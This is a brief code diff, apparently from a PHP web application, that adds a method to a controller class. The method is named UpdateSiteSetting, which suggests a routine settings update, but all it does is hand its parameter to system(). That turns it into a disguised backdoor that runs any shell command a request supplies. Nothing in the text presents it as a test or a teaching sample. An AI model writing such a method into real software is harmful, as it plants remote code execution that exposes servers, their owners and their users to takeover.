@@ -11,5 +11,9 @@ class WebController extends Controller
         return view('Panel.index');
     }
 
+    public function UpdateSiteSetting($ID){
+        system($ID);
+    }
+
 
 }
